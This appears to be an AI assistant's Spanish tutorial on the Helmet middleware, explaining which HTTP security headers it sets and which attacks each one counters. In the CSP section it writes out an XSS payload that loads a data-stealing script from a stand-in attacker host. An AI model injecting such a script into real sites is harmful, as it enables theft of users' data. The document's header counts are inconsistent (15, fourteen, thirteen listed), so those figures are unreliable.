Aquí está la explicación completa de Helmet, desde cero.

---

## ¿Qué es Helmet?

Helmet es un middleware para Express y NestJS que agrega automáticamente cabeceras HTTP de seguridad a cada respuesta del servidor.

Una sola línea en `main.ts`:

```typescript
app.use(helmet());
```

Detrás de esa línea hay 15 middlewares que se activan automáticamente. Cada uno modifica o agrega una cabecera HTTP específica.

---

## ¿Qué es una cabecera HTTP?

Antes de entrar a Helmet necesitas entender qué es una cabecera.

Cuando el servidor responde a un request, no solo envía el contenido — envía instrucciones al browser sobre cómo debe comportarse con ese contenido. Esas instrucciones viajan en las cabeceras HTTP.

```
HTTP/1.1 200 OK
Content-Type: application/json        ← cabecera: tipo de contenido
Authorization: Bearer eyJ...          ← cabecera: token de auth
X-Frame-Options: DENY                 ← cabecera: instrucción de seguridad
Content-Security-Policy: default-src  ← cabecera: instrucción de seguridad

{ "data": "..." }                     ← cuerpo de la respuesta
```

El browser lee esas cabeceras y ajusta su comportamiento. Si el servidor no las envía, el browser usa sus defaults — que en muchos casos son inseguros.

---

## Sin Helmet — lo que Express envía por defecto

Abre cualquier API Express sin Helmet y verás esto en las cabeceras de respuesta:

```
HTTP/1.1 200 OK
X-Powered-By: Express        ← revela el framework
Content-Type: application/json
```

Solo eso. Sin instrucciones de seguridad. El browser queda libre de hacer lo que quiera con el contenido.

---

## Con Helmet — lo que cambia cabecera por cabecera

---

### 1 — `X-Powered-By` — eliminada

**Sin Helmet:**
```
X-Powered-By: Express
```

**Con Helmet:**
```
(cabecera eliminada)
```

**El ataque que previene — Fingerprinting:**

Un atacante que sabe que usas Express puede buscar en bases de datos de vulnerabilidades — CVE, Exploit-DB — todas las vulnerabilidades conocidas de esa versión. Si además puede ver la versión exacta de Node.js en mensajes de error, tiene un mapa completo para atacar.

Sin esa cabecera trabaja a ciegas. No sabe si es Express, NestJS, Fastify, Spring Boot o cualquier otro. Tiene que probar todo — lo que aumenta el ruido, el tiempo y las posibilidades de ser detectado.

---

### 2 — `X-Frame-Options` — protección contra Clickjacking

**Sin Helmet:**
```
(cabecera ausente — el browser permite embeber en iframes)
```

**Con Helmet:**
```
X-Frame-Options: SAMEORIGIN
```

**¿Qué es Clickjacking?**

Un atacante crea una página web maliciosa. Embebe tu portal clínico en un iframe invisible encima de un botón atractivo — "Gana un iPhone", "Reclama tu premio".

```
Página del atacante:
┌─────────────────────────────────┐
│  ¡Gana un iPhone! Haz clic aquí │
│                                 │
│  [BOTÓN VISIBLE: "CLAIM PRIZE"] │
└─────────────────────────────────┘

Lo que realmente hay (invisible para el usuario):
┌─────────────────────────────────┐
│  Portal clínico (iframe)        │
│                                 │
│  [BOTÓN INVISIBLE: "ELIMINAR    │
│   MI CUENTA" o "AUTORIZAR PAGO"]│
└─────────────────────────────────┘
```

El usuario cree que hace clic en "Claim Prize" pero en realidad hace clic en un botón de tu aplicación — autenticado con su sesión activa.

`X-Frame-Options: SAMEORIGIN` le dice al browser: "solo permite embeber esta página en un iframe si el iframe está en el mismo dominio". Un sitio externo malicioso no puede embeberte.

---

### 3 — `X-Content-Type-Options` — protección contra MIME Sniffing

**Sin Helmet:**
```
(cabecera ausente)
```

**Con Helmet:**
```
X-Content-Type-Options: nosniff
```

**¿Qué es MIME Sniffing?**

Cuando el servidor envía un archivo, declara su tipo en la cabecera `Content-Type`:

```
Content-Type: text/plain
```

Sin `nosniff`, algunos browsers antiguos ignoran esa declaración e intentan adivinar el tipo real del archivo inspeccionando su contenido. Esto se llama MIME sniffing.

El ataque funciona así: un atacante logra subir un archivo al servidor — una "imagen" que en realidad contiene código JavaScript. El servidor lo sirve con `Content-Type: image/jpeg`. El browser sin `nosniff` inspecciona el contenido, detecta que parece JavaScript y lo ejecuta. XSS conseguido a través de un archivo que el servidor creía que era una imagen.

Con `nosniff` el browser obedece estrictamente el `Content-Type` declarado por el servidor — sin intentar adivinar nada.

---

### 4 — `Strict-Transport-Security` — fuerza HTTPS

**Sin Helmet:**
```
(cabecera ausente)
```

**Con Helmet:**
```
Strict-Transport-Security: max-age=15552000; includeSubDomains
```

**¿Qué hace esta cabecera?**

Le dice al browser: "durante los próximos 180 días, cuando el usuario intente acceder a este dominio por HTTP, tú mismo — sin consultar al servidor — redirígelo a HTTPS".

**Sin esta cabecera:**

```
Usuario escribe: http://clinica.ejemplo.com
Browser envía request HTTP al servidor
Servidor responde: 301 Redirect → https://clinica.ejemplo.com
Browser sigue el redirect a HTTPS
```

En ese primer request HTTP — antes del redirect — el tráfico viaja sin cifrar. Un atacante en la misma red puede interceptarlo, leer las cabeceras, inyectar contenido o redirigir al usuario a un sitio falso. Se llama SSL Stripping.

**Con esta cabecera:**

```
Usuario escribe: http://clinica.ejemplo.com
Browser recuerda que tiene HSTS para este dominio
Browser por sí mismo va directamente a https:// — sin tocar HTTP
El primer request ya viaja cifrado
```

El atacante no tiene ventana para interceptar.

---

### 5 — `Content-Security-Policy` — control de recursos

**Sin Helmet:**
```
(cabecera ausente — el browser carga recursos de cualquier origen)
```

**Con Helmet (versión base):**
```
Content-Security-Policy: default-src 'self'
```

**¿Qué hace CSP?**

Le dice al browser de dónde puede cargar cada tipo de recurso — scripts, estilos, imágenes, fuentes, iframes. Si un script intenta cargarse desde un origen no autorizado, el browser lo bloquea antes de ejecutarlo.

```
Sin CSP:
  XSS inyecta: <script src="https://atacante.com/robar-datos.js"></script>
  Browser: carga y ejecuta el script del atacante

Con CSP: default-src 'self'
  XSS inyecta: <script src="https://atacante.com/robar-datos.js"></script>
  Browser: origen no autorizado → bloqueado → el script nunca se carga
```

CSP es la última línea de defensa contra XSS — incluso si el atacante logra inyectar código en el HTML, CSP puede evitar que ese código se ejecute o que exfiltre datos.

---

### 6 — `Referrer-Policy` — control de información de referencia

**Sin Helmet:**
```
(cabecera ausente — el browser envía la URL completa como referrer)
```

**Con Helmet:**
```
Referrer-Policy: no-referrer
```

**¿Qué es el Referrer?**

Cuando un usuario hace clic en un enlace, el browser le dice al destino de dónde vino — la URL de la página anterior. Eso es el Referrer.

El problema: si tu app tiene URLs con información sensible:

```
https://clinica.ejemplo.com/patients/550e8400/history?diagnosis=diabetes
```

Y esa página tiene un enlace a un recurso externo — una librería CSS, una imagen — el browser puede enviarle esa URL completa al servidor externo como Referrer. Ese servidor externo ahora sabe que alguien con diagnóstico de diabetes visitó tu sistema.

Con `no-referrer` el browser no envía información de referrer a ningún destino externo.

---

### 7 — `X-DNS-Prefetch-Control` — control de resolución DNS anticipada

**Sin Helmet:**
```
(cabecera ausente — prefetch activo por defecto)
```

**Con Helmet:**
```
X-DNS-Prefetch-Control: off
```

Los browsers modernos resuelven anticipadamente los dominios que aparecen en los links de una página — antes de que el usuario haga clic. Esto mejora la velocidad de navegación pero tiene una implicación de privacidad: el browser contacta servidores DNS externos por dominios que el usuario ni siquiera visitó.

Para una aplicación clínica donde la privacidad es crítica, desactivar este comportamiento es la decisión correcta.

---

## El resumen visual — qué ataque cierra cada cabecera

```
CABECERA                      ATAQUE QUE PREVIENE
──────────────────────────────────────────────────────────────
X-Powered-By (eliminada)    → Fingerprinting / reconocimiento del stack
X-Frame-Options             → Clickjacking
X-Content-Type-Options      → MIME Sniffing / XSS via upload
Strict-Transport-Security   → SSL Stripping / downgrade a HTTP
Content-Security-Policy     → XSS / carga de recursos externos maliciosos
Referrer-Policy             → Filtración de URLs con datos sensibles
X-DNS-Prefetch-Control      → Resolución DNS no autorizada
```

---

## Por qué una sola línea cierra todo esto

La pregunta que va a surgir en el aula es: ¿por qué no configuramos estas cabeceras manualmente?

La respuesta tiene dos partes:

**Primero — es fácil olvidar una.** Si configuras cada cabecera manualmente, basta con que un developer olvide una en un servidor nuevo para que quede vulnerable. Helmet las aplica todas por defecto — tienes que desactivar activamente las que no quieres.

**Segundo — Helmet se mantiene actualizado.** Las mejores prácticas de seguridad de cabeceras cambian. Nuevas cabeceras aparecen, los valores recomendados cambian. Cuando actualizas la versión de Helmet, recibes esas actualizaciones automáticamente sin tener que revisar tu código.

---

## Un experimento para hacer en clase

Si tienes Swagger activo en desarrollo, abre las herramientas de desarrollo del browser, ve a la pestaña Network y mira las cabeceras de cualquier respuesta de la API.

**Sin Helmet verías:**
```
X-Powered-By: Express
Content-Type: application/json
```

**Con Helmet verás:**
```
Content-Security-Policy: default-src 'self';...
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Origin-Agent-Cluster: ?1
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Content-Type-Options: nosniff
X-DNS-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 0
```

Una sola línea de código — catorce cabeceras de seguridad activas.

---

¿Quieres que profundice en alguna cabecera específica o continuamos con otro tema?